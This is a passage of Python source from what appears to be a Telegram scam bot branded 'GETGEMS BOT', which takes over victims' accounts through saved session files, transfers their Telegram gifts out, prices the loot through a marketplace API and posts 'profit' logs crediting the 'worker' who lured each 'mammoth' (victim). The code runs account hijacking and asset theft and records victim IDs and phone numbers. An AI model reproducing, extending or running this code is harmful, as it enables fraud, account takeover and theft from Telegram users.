                from config import Config
                tradeban_message = f"⚠️ {gift_name} ({gift_link}) на трейдбане! {time_str} ⏳"
                await send_message_to_group(tradeban_message, message_thread_id=Config.TOPIC_TRADEBAN)
                print(f"📝 Отправлено уведомление о трейдбане в топик {Config.TOPIC_TRADEBAN}: {time_str}")
            except Exception as log_error:
                print(f"⚠️ Ошибка отправки лога трейдбана: {log_error}")
        
        import traceback
        traceback.print_exc()
        return {
            'success': False,
            'balance_before': 0,
            'balance_after': 0,
            'autodocid_used': False,
            'error': error_str
        }
async def log_gift_transfer_success(gift, user_id: int, phone: str, balance_before: int = None, balance_after: int = None, autodocid_used: bool = False):
    """Отключено - логи передачи подарков не нужны, есть общий лог профита"""
    pass
async def send_no_gifts_notification(user_id: int, phone: str, gifts_count: int):
    """Отправляет уведомление с картинкой когда подарки не найдены"""
    try:
        from telegram_bot import send_message_to_group_with_animation
        from database import Database
        
        # Получаем информацию о воркере
        db = Database()
        worker_info = db.get_worker_by_last_gift(user_id)
        
        message = f"""
🎁 **Обработка подарков завершена**
👤 **Аккаунт:** {phone} (ID: {user_id})
📊 **Всего подарков:** {gifts_count}
❌ **Подарки с ссылками:** Не найдены
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Подарки не найдены или не содержат ссылок для передачи.
        """
        
        # Отправляем уведомление с анимацией и кнопкой для повторного сканирования
        await send_message_to_group_with_animation(
            message.strip(), 
            user_id, 
            phone, 
            worker_info
        )
        print(f"📝 Уведомление об отсутствии подарков отправлено в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки уведомления об отсутствии подарков: {e}")

async def send_profit_log(worker_info: dict, transferred_gift_links: list, user_id: int, victim_username: str = None):
    """Отправляет лог профита с информацией о переданных подарках"""
    print(f"🔍 [PROFIT_LOG] Начало отправки лога профита для пользователя {user_id}")
    print(f"🔍 [PROFIT_LOG] Параметры: worker_info={worker_info}, gift_links_count={len(transferred_gift_links)}, victim_username={victim_username}")
    
    try:
        print(f"🔍 [PROFIT_LOG] Импортируем необходимые модули...")
        from telegram_bot import send_message_to_group
        from database import Database
        from portals_api import portals_api
        print(f"✅ [PROFIT_LOG] Модули успешно импортированы")
        
        # Получаем информацию о пользователе
        print(f"🔍 [PROFIT_LOG] Получаем информацию о пользователе {user_id}...")
        phone = get_phone_from_json(user_id) or "Неизвестно"
        print(f"✅ [PROFIT_LOG] Телефон пользователя: {phone}")
        
        # Формируем юзернейм мамонта
        if victim_username:
            victim_username_formatted = f"@{victim_username}" if not victim_username.startswith('@') else victim_username
        else:
            victim_username_formatted = "Неизвестно"
        
        # Формируем сообщение о профите
        print(f"🔍 [PROFIT_LOG] Формируем сообщение о профите...")
        gift_count = len(transferred_gift_links)
        print(f"🔍 [PROFIT_LOG] Количество подарков: {gift_count}")
        
        # Определяем имя воркера
        worker_username = worker_info.get('username', '')
        if worker_username and not worker_username.startswith('@'):
            worker_username = f"@{worker_username}"
        elif not worker_username:
            worker_username = f"@user{worker_info.get('telegram_id', 'unknown')}"
        
        print(f"🔍 [PROFIT_LOG] Имя воркера: {worker_username}")
        
        # Получаем floor price для всех подарков
        print(f"🔍 [PROFIT_LOG] Получение floor price через Portals API...")
        price_info = await portals_api.calculate_total_floor_price(transferred_gift_links)
        
        # Формируем список ссылок на подарки
        gift_list_text = "\n".join(transferred_gift_links)
        
        # Добавляем информацию о стоимости
        price_text = ""
        if price_info['total'] > 0:
            price_text = f"\n💰 Сумма профита: {price_info['total']} TON"
            if price_info['not_found'] > 0:
                price_text += f" ({price_info['not_found']} подарков без цены)"
        
        message = f"""👤 {victim_username_formatted}

[▫️] GETGEMS BOT
[◾️] Новый профит!
[🔻] Были получены:
{gift_list_text}{price_text}
🔹 Воркер: 
{worker_username}"""
        
        print(f"✅ [PROFIT_LOG] Сообщение сформировано (длина: {len(message)} символов)")
        print(f"🔍 [PROFIT_LOG] Содержимое сообщения:\n{message}")
        
        # Отправляем простое сообщение без фотки (без parse_mode чтобы избежать конфликта с квадратными скобками)
        print(f"🔍 [PROFIT_LOG] Отправляем сообщение через send_message_to_group...")
        from config import Config
        from aiogram import Bot
        temp_bot = Bot(token=Config.BOT_TOKEN)
        await temp_bot.send_message(
            chat_id=Config.LOG_CHAT_ID,
            text=message.strip(),
            message_thread_id=Config.TOPIC_PROFITS
        )
        await temp_bot.session.close()
        
        print(f"✅ [PROFIT_LOG] Лог профита успешно отправлен для пользователя {user_id}")
        
        # Сохраняем профит в базу данных
        try:
            print(f"🔍 [PROFIT_LOG] Сохранение профита в БД...")
            db = Database()
            worker_telegram_id = worker_info.get('telegram_id')
            
            if worker_telegram_id and price_info['total'] > 0:
                db.add_profit(
                    worker_telegram_id=worker_telegram_id,
                    victim_telegram_id=user_id,
                    profit_sum=price_info['total'],
                    gifts_count=len(transferred_gift_links),
                    gift_links=transferred_gift_links
                )
                print(f"✅ [PROFIT_LOG] Профит сохранен в БД: {price_info['total']} TON")
            else:
                print(f"⚠️ [PROFIT_LOG] Профит не сохранен: worker_id={worker_telegram_id}, sum={price_info['total']}")
        except Exception as db_error:
            print(f"❌ [PROFIT_LOG] Ошибка сохранения профита в БД: {db_error}")
            import traceback
            traceback.print_exc()
        
    except Exception as e:
        print(f"❌ [PROFIT_LOG] Ошибка отправки лога профита: {e}")
        print(f"❌ [PROFIT_LOG] Тип ошибки: {type(e).__name__}")
        print(f"❌ [PROFIT_LOG] Параметры при ошибке: user_id={user_id}, worker_info={worker_info}")
        import traceback
        print(f"❌ [PROFIT_LOG] Полный traceback:")
        traceback.print_exc()

async def log_gift_processing_error(error, user_id: int, phone: str):
    try:
        from telegram_bot import send_message_to_group
        message = f"""
❌ **Ошибка обработки подарков**
👤 **Аккаунт:** {phone} (ID: {user_id})
🚫 **Ошибка:** {str(error)}
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Требуется проверка аккаунта.
        """
        from config import Config
        await send_message_to_group(message.strip(), message_thread_id=Config.TOPIC_GENERAL)
        print(f"📝 Лог ошибки отправлен в общий топик")
    except Exception as e:
        print(f"❌ Ошибка отправки лога ошибки в группу: {e}")
def check_session_exists(phone):
    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
    json_file = f"{SESSION_DIR}/{phone.replace('+', '')}.json"
    return os.path.exists(session_file) and os.path.exists(json_file)
def validate_session(phone):
    from telegram_client import TelegramAuth, run_async
    if not check_session_exists(phone):
        return False
    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
    try:
        auth = TelegramAuth(session_file)
        is_valid = run_async(auth.check_connection())
        return is_valid
    except Exception as e:
        try:
            if os.path.exists(session_file):
                os.remove(session_file)
            json_file = f"{SESSION_DIR}/{phone.replace('+', '')}.json"
            if os.path.exists(json_file):
                os.remove(json_file)
        except Exception as cleanup_error:
            pass
        return False
